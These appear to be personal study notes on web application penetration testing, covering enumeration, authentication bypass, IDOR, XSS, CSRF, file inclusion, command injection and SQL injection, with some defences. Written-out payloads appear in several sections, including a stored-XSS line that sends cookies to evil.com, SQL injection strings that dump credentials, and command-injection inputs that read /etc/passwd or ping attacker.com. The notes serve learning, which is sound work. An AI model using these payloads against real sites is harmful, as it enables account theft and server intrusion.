##### **3.1 Walking an Application**
It means browsing a website to understand how it works, page by page, looking for anything weird or vulnerable. We do this to:
- See how it handles users, forms & requests.
- Understand structure, inputs and functionality
- Look for entry points like login forms, upload boxes etc.

We only use our browser and it's inbuilt tools to perform application walking:
- Developer Tools
- Network Tab (for credentials)
- Application Tab (for cookies)
- URL bar (try adding /admin to end of URL)

###### **Step-by-step execution**
1. URLs & Parameters:
	- Visit different pages
	- Check changes in URL (like changes in product id)
	- Try modifying parameters (`id=999` or `id = abc`)
2. Forms & Inputs:
	- Login forms, search boxes or contact forms
	- Look for the behaviour of site when we input data, good or bad (SQL injections)
3. Cookies & Storage:
	- Go to `inspect` > Application Tab
	- Look at cookies, for any weird tokens (to impersonate) or base64 values(to decrypt into credentials)
4. Network Requests:
	- On the network tab, check for requests, headers and responses
	- Look for API calls or background data fetching
	- Vulnerable sites may hold credentials in plain text here
5. Response Behaviour:
	- Site response to wrong input, empty fields or unauthorized access.

##### **3.2 Content Discovery**
It is the process to find out hidden or unlinked pages, files or directories on a website which are not visible through normal navigation. It is important to perform content discovery as we may find:
- Backup files with passwords and database dumps
- Old admin login pages
- Debug or test pages left by devs
- Hidden APIs or endpoints

###### **Performing Content Discovery**
There are 2 ways to do it:
1. Manual Guessing: We type common folder names in the browser url like: /admin, /backup, /test, /old, /config.php, /robots.txt
2. Automated tools: We use specialised tools to automatically try thousands of possible URLs. Some tools are
	- Gobuster
	- Dirbuster
	- FFUF

*We check the type of content, whether its backup file with passwords, admin login page, configuration file, API endpoint etc, which can give us further clues to exploit the system.* 

##### **3.3 Sub-Domain Enumeration**
It is a process of finding hidden or lesser-known subdomains within a domain. e.g. api.example.com , admin.example.com etc. We find subdomains as it expands the attack surface.  Hidden subdomains often
- Run outdated services
- Don't enforce HTTPS
- Are used by devs and then forgotten
- Aren't protected with login
- Leak data
*All of these are great entry point for attackers*

There are various ways to do subdomain enumeration:
1. Manual guessing: try basic guesses like admin.target.com or test.target.com. 
2. Check certificate transparency logs from sites like `https://crt.sh` or `https://transparencyreport.google.com` as subdomains are mentioned in the certificates. 
3. Use online tools: like `securitytrails.com` , `dnsdumpster.com`, `subdomainfinder.c99.nl` 
4. Tools like `ffuf`,`Sublist3r` or `amass` can be used along with a common wordlist

##### **3.4 Authentication Bypass**
Authentication is a system's way to find out if we are a legit user or not. Bypassing it means tricking the system to get inside without any id or password. If an attacker is successful in authentication bypassing, they can:
- Access admin panels without being admin
- View user data, internal dashboards or restricted APIs
- Launch further attacks (uploading shells, session stealing etc)

There are different ways to perform authentication bypass:
1. **Using default credentials**: We can use basic username and passwords to access into the system. e.g. `admin:admin`, `test:test`, `admin:password123`
2. **SQL injections**: We use classic code `' OR '1'='1` which always returns true, so a vulnerable website will consider these credentials as true and will give access. 
3. **Broken Logic**: It happens when the application skips some steps, or directly trust the client side responses. e.g.
	- Login forms only check usernames and not passwords
	- access admin page by directly adding `/admin` in the url
	- `"isAdmin":false` can be changed to true in request if its visible using DevTools or even advanced tools like BurpSuite
4. **Poor session management**: Sessions are used to track the user after they login. If the session tokens are hard coded, like `admin:1234` then they can be copied to impersonate the user. Or, using predictable cookies like `userID=1` or `userID=2`.4
5. **Path Manipulation or Forced Browsing**: We login as a regular user and then try putting `/admin` or `/dashboard` etc to get direct access without authentication. 

*Tools like BurpSuite, Firefox DevTools, SQLMap, Gobuster, Hydra etc are especially used for authentication bypass*

##### **3.5 IDOR (Insecure Direct Object Reference)
It is when an app exposes references to objects like UIDs, order numbers, documents etc and doesn't check if we are allowed to access them. In simple terms, if we know the object ID, system assumes that we have the permission to access it. 

IDOR shows up un the places where user-controlled input is used to retrieve data:
- URLs : `GET /profile?user_id=1001
- API calls:  `POST /orders/view { "order_id": 5555 }`
- Files and documents: `GET /invoice/123.pdf`
- Delete/edit actions:  `DELETE /comment?id=456`

With the help of IDOR, we can: 
- Access someone else’s **profile**
- View another user’s **order history**
- Download private **documents or invoices**
- Delete or modify **other users' data**
- Escalate privileges in apps with poor validation

*Tools like BurpSuite, DevTools, Postman etc are used for IDOR*

##### **3.6 Cross-site Scripting (XSS)
It is about injecting JavaScript into webpages that runs in other users' browsers.

###### Reflected XSS:
It happens on search bars, contact forms, URLS etc.  E.g.: A link that is like `http://vulnerable.com/search?q=Vedant` might be changed into `http://vulnerable.com/search?q=<script>alert('XSS')</script>`. If the server doesn't verify the link, then the script added in the link would run. 

###### Stored XSS:
It is stored in the database and is triggered when other users are viewing that data. It can be found in comment sections, chat messages or even profile names. E.g. `<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>` would leak the cookies of every user if not checked by the server/site. 

###### DOM-Based XSS:
This method doesn't involve the server. It takes advantage of the trust between browser and server and messes the JavaScript of the browser. E.g. a code like `document.location.href
`document.write(user_input)`
`innerHTML = user_input` would allow the attacker to enter key logs of the user in a file, hence compromising passwords or other sensitive information.

![[Pasted image 20250526103738.png]]


##### **3.7 – CSRF (Cross-Site Request Forgery)**
**CSRF** is when a malicious site tricks a logged-in user into performing unwanted actions on **another site** where they’re authenticated. E.g. A website on tab 2 (malicious website) of your browser might trick the banking tab on your browser to initiate a transaction.
The reason it works is because the browser auto-sends the session cookies to the authentic website. 

If there is a `target.com` and `evil.com` then this is how CSRF works: 
![[Pasted image 20250526104156.png]]

There are various vulnerable scenarios, like changing email/password, add attacker as admin for privilege escalation, delete an account or transfer money. 

##### **3.8 File Inclusion**
File inclusion vulnerability allow an attacker to trick the server into loading r executing unauthorized files, either locally or remotely, which is why its categorized in two parts:
	1. LFI: Local File Inclusion, includes the file from the local server
	2. RFI: Remote File Inclusion, includes the file from an external server like HTTP/S

The core concept of its working is something like this:
Most PHP (and some python or JavaScript) apps use something like `<?php include($_GET['page']); ?>` 
Now if the `$_GET['page']` is not validated, the attacker can inject local or remote files in the place holder.
Example: (Thank you ChatGPT)
![[Pasted image 20250527130819.png]]

File inclusion can allow an attacker to leak credentials, config files or to get shell access. Or the attacker can include php code in a log file and execute it via LFI, hence code execution. 

##### **3.9 Command Injection:**
Command Injection is when an attacker is able to inject and execute system-level commands on the server. This happens when user input is passed directly into a system command without proper sanitization. 
![[Pasted image 20250527131552.png]]
In the above example, the malicious user added `; ls` at the end of input, which will now not only ping the IP, but also list all the files of the server side where this code is running. Other commands like `cat etc/passwd` or `whoami` etc can be added which would run as code and give output to the attacker. 
In case the application or result is not an actual output, the attacker can use timing or network based payloads. 
`127.0.0.1; sleep 10`
`127.0.0.1 && ping -c 1 attacker.com`
If the response is delayed, then it means CI can be executed. The attacker can use CI and do the following things:
- Dump system info
- Create reverse shell (remote connection to server)
- Add users
- Modify config files
- Full system compromise if root

To prevent command injection
1. Never pass input to the command shell directly
2. Use safe functions (like `exec()` with argument arrays)
3. Whitelist input formats (like allowing only numbers where ever possible)
4. Use input validation libraries or frameworks

##### **3.10 SQL Injection:**
It is when an attacker injects malicious SQL codes in the input fields that get passed directly to a database query, which can then read, modify or delete the data which was supposedly confidential. 
![[Pasted image 20250527132452.png]]

There are different types of SQL injections:
1. Authentication Bypass: Used to login without using credentials (most common)
2. Union-Based SQLi: Used to dump database content using `UNION SELECT`
	- `' UNION SELECT username, password FROM users--`
3. Error-Based SQLi: Injecting values that throw SQL errors to reveal DB structures.
	- `' ORDER BY 100--
4. Blind SQLi: N output, but behaviour can be used to detect changes. (e.g. `AND 1=1` works but `AND 1=2` doesn't)
![[Pasted image 20250527132831.png]]


To defend against SQL injections:
- Use parameterized queries: Instead of using `"SELECT * FROM users WHERE name = '$name'"` , use `cursor.execute("SELECT * FROM users WHERE name = ?", (name,))`
- Limit database permissions: 
	- Create **read-only** users for public-facing pages.
	- Use **separate DB accounts** for different features.
	- **Deny DROP, DELETE, ALTER** unless truly needed.
- Input Validation & Escaping: Only accept what's expected, like no text on numbers input, and using 'escaping' to treat any input as data/text and not code. 